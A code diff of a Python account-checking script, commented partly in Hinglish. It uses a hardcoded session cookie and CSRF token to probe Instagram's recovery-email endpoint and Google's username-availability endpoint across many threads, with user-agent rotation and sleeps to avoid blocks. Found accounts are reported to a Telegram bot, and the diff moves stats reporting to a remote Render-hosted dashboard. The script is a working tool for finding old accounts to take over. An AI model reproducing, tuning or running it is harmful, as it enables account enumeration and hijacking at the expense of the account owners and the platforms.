@@ -19,13 +19,15 @@ from colorama import Fore, Style, init
 
 init(autoreset=True)
 
-# ================= DASHBOARD SYNC LOGIC =================
+# ================= FIXED DASHBOARD SYNC LOGIC =================
 def send_to_dashboard(stat_type):
     try:
-        # Dashboard (app.py) ko hit/bad signal bhejna
-        requests.post('http://127.0.0.1:5000/update_stats', json={'type': stat_type}, timeout=0.5)
+        # Render Live URL for syncing stats
+        url = 'https://system-override-v2.onrender.com/update_stats'
+        requests.post(url, json={'type': stat_type}, timeout=2)
     except:
         pass
+# =============================================================
 
 # Arguments check (Dashboard passes ID and Token)
 if len(sys.argv) > 2:
@@ -34,7 +36,6 @@ if len(sys.argv) > 2:
 else:
     ID = input("\033[1;36mEnter Telegram ID: ")
     TOKEN = input("\033[1;36mEnter Bot Token: ")
-# =========================================================
 
 INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
 COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
@@ -62,29 +63,35 @@ def check_gmail(email):
     global bad_email, hits
     try:
         email_prefix = email.split('@')[0] if '@' in email else email
-        with open(TOKEN_FILE, 'r') as f:
-            token_data = f.read().splitlines()[0]
-        tl, host = token_data.split('//')
-        
-        headers = {
-            'authority': 'accounts.google.com',
-            'google-accounts-xsrf': '1',
-            'user-agent': generate_user_agent()
-        }
-        params = {'TL': tl}
-        data = f"f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
-        
-        response = pp("https://accounts.google.com/_/signup/usernameavailability", params=params, headers=headers, data=data)
-        
-        if '"gf.uar",1' in response.text:
-            hits += 1
-            send_to_dashboard('hit') # DASHBOARD UPDATE
-            update_stats_terminal()
-            InfoAcc(email_prefix, "gmail.com")
+        # Path check for Render
+        if os.path.exists(TOKEN_FILE):
+            with open(TOKEN_FILE, 'r') as f:
+                token_data = f.read().splitlines()[0]
+            tl, host = token_data.split('//')
+            
+            headers = {
+                'authority': 'accounts.google.com',
+                'google-accounts-xsrf': '1',
+                'user-agent': generate_user_agent()
+            }
+            params = {'TL': tl}
+            data = f"f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
+            
+            response = pp("https://accounts.google.com/_/signup/usernameavailability", params=params, headers=headers, data=data)
+            
+            if '"gf.uar",1' in response.text:
+                hits += 1
+                send_to_dashboard('hit') 
+                update_stats_terminal()
+                InfoAcc(email_prefix, "gmail.com")
+            else:
+                bad_email += 1
+                send_to_dashboard('bad') 
+                update_stats_terminal()
         else:
+            # If tl.txt missing, still count as bad for dashboard sync
             bad_email += 1
-            send_to_dashboard('bad') # DASHBOARD UPDATE
-            update_stats_terminal()
+            send_to_dashboard('bad')
     except:
         pass
 
@@ -109,13 +116,12 @@ def check(email):
             update_stats_terminal()
         else:
             bad_insta += 1
-            send_to_dashboard('bad') # DASHBOARD UPDATE
+            send_to_dashboard('bad') 
             update_stats_terminal()
     except:
         pass
 
 def InfoAcc(username, domain):
-    # Telegram hit message logic
     info_text = f"""
 ━━━━━━━━━━━━━━━
 🚀 HIT FOUND (2013-15)
@@ -145,12 +151,11 @@ def eizon_python():
             if username:
                 check(username + eizon_domain)
         except:
-            time.sleep(1) # Block hone se bachne ke liye
+            time.sleep(2)
 
-# Threads Start
-for _ in range(50):
+# Threads - Render Free Tier par 10-15 threads best hain performance ke liye
+for _ in range(15):
     Thread(target=eizon_python, daemon=True).start()
 
-# Script ko zinda rakhne ke liye
 while True:
     time.sleep(10)
